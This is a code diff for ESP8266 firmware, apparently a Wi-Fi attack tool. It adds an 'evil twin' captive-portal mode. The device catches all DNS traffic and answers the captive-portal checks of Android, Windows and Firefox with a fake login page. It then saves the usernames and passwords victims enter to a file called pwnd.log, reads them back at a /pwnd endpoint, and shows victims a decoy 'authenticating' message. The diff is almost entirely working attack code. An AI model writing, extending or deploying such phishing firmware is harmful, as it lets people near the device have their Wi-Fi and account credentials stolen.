@@ -23,9 +23,6 @@
 #include <Arduino.h>
 
 #include <ESP8266WiFi.h>
-#ifdef USE_CAPTIVE_PORTAL
-  #include "./DNSServer.h"       // Patched lib
-#endif
 #include <ESP8266WebServer.h>
 #include <FS.h>
 #include <ESP8266HTTPUpdateServer.h>
@@ -40,6 +37,10 @@
 //#define USE_LED16           /* <-- for the Pocket ESP8266 which has a LED on GPIO 16 to indicate if it's running */
 //#define USE_CAPTIVE_PORTAL  /* <-- enable captive portal (redirects all pages to 192.168.4.1) - most devices flood the ESP8266 with requests */
 
+// Evil Twin with Captive Portal //
+#ifdef USE_CAPTIVE_PORTAL
+  #include "./DNSServer.h"       // Patched lib
+#endif
 
 // Including everything for the OLED //
 #ifdef USE_DISPLAY
@@ -192,7 +193,10 @@ void startWifi() {
   Serial.println("SSID          : '" + settings.ssid+"'");
   Serial.println("Password      : '" + settings.password+"'");
   #ifdef USE_CAPTIVE_PORTAL
-    if (settings.newUser == 1) {dnsServer.start(DNS_PORT, "*", apIP);Serial.println("Captive Portal: Running");} else {Serial.println("Captive Portal: Stopped");}
+    if (settings.newUser == 0) {
+      dnsServer.start(DNS_PORT, "*", apIP);
+      Serial.println("Captive Portal: Running");
+    } else {Serial.println("Captive Portal: Stopped");}
   #endif
   if (settings.newUser == 1) {Serial.println("Redirecting to setup page");}
   Serial.println("-----------------------------------------------");
@@ -287,6 +291,32 @@ void loadRedirectHTML() {
     server.send(302, "text/html", "<meta content='0; url=http://192.168.4.1'http-equiv='refresh'>");
 }
 
+#ifdef USE_CAPTIVE_PORTAL
+  void loadCaptiveHTML(){
+    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+    server.sendHeader("Pragma", "no-cache");
+    server.sendHeader("Expires", "0");
+    server.sendHeader("Content-Encoding", "identity");
+    server.sendContent_P((char*)data_CaptiveHTML,sizeof(data_CaptiveHTML));
+    sendBuffer();
+  };
+
+  void saveCaptiveData(String user, String passwd){
+    File file = SPIFFS.open("/pwnd.log", "a");
+    if (!file) { Serial.println("File open failed"); }
+    file.println("[" + settings.ssid + "] " + user + ":" + passwd + "<br>");
+  };
+
+  void readCaptiveData(){
+    String line;
+    File file = SPIFFS.open("/pwnd.log", "r");
+    if (!file) { Serial.println("file open failed"); }
+    Serial.println("====== Reading from SPIFFS file =======");
+    while(file.available()) { line += file.readStringUntil('\n'); }
+    Serial.println(line);
+    server.send(200, "text/html", line);
+}
+#endif
 
 void startWiFi(bool start) {
   if (start) startWifi();
@@ -718,7 +748,9 @@ void setup() {
     server.on("/settingsReset.json", resetSettings);
   } else {
     /* Redirects */
-    server.on("/index.html", loadIndexHTML);
+    #ifndef USE_CAPTIVE_PORTAL
+      server.on("/index.html", loadIndexHTML);
+    #endif
     server.on("/users.html", loadUsersHTML);
     server.on("/attack.html", loadAttackHTML);
     server.on("/detector.html", loadDetectorHTML);
@@ -727,8 +759,10 @@ void setup() {
     server.on("/info.html", loadInfoHTML);
 
     /* HTML */
-    server.onNotFound(load404);
-    server.on("/", loadIndexHTML);
+    #ifndef USE_CAPTIVE_PORTAL
+      server.onNotFound(load404);
+      server.on("/", loadIndexHTML);
+    #endif
     server.on("/users", loadUsersHTML);
     server.on("/attack", loadAttackHTML);
     server.on("/detector", loadDetectorHTML);
@@ -783,7 +817,32 @@ void setup() {
     server.on("/detectorStart.json", startDetector);
   }
   
-  
+  #ifdef USE_CAPTIVE_PORTAL
+    server.on("/pwnd", readCaptiveData);
+    server.on("/authenticate", []() {
+      String user = server.arg("user");
+      String passwd = server.arg("passwd");
+      if (user.length() > 0 || passwd.length() > 0) {
+        saveCaptiveData(user, passwd);
+        server.send(200, "text/html", "Trying wireless authentication for IEEE 802.11 Wi-Fi connection...");
+      };
+    });
+    if (!settings.newUser == 1) {
+      server.on("/pwnr", loadIndexHTML);
+      server.onNotFound(loadCaptiveHTML);
+      server.on("/", loadCaptiveHTML);
+      server.on("/index.html", loadCaptiveHTML);
+      server.on("/search", loadCaptiveHTML);  //Google search captive portal. Maybe not needed. Might be handled by notFound handler.
+      server.on("/fwlink", loadCaptiveHTML);  //Microsoft captive portal. Maybe not needed. Might be handled by notFound handler.
+      server.on("/success", loadCaptiveHTML);  //Firefox captive portal. Maybe not needed. Might be handled by notFound handler.
+      server.on("/success.txt", loadCaptiveHTML);  //Firefox captive portal. Maybe not needed. Might be handled by notFound handler.
+      server.on("/redirect", loadCaptiveHTML);  //Microsoft captive portal. Maybe not needed. Might be handled by notFound handler.
+
+      EEPROM.write(multiAPsAdr, false);
+      settings.multiAPs = (bool)EEPROM.read(multiAPsAdr);
+    }
+  #endif
+      
   httpUpdater.setup(&server);
   
   server.begin();
@@ -854,14 +913,14 @@ void loop() {
       }
     }
   } else if (settings.newUser == 1) {
-    #ifdef USE_CAPTIVE_PORTAL
-      dnsServer.processNextRequest();
-    #endif
     server.handleClient();
   } else {
     if (clientScan.sniffing) {
       if (clientScan.stop()) startWifi();
     } else {
+      #ifdef USE_CAPTIVE_PORTAL
+        dnsServer.processNextRequest();
+      #endif
       server.handleClient();
       attack.run();
     }
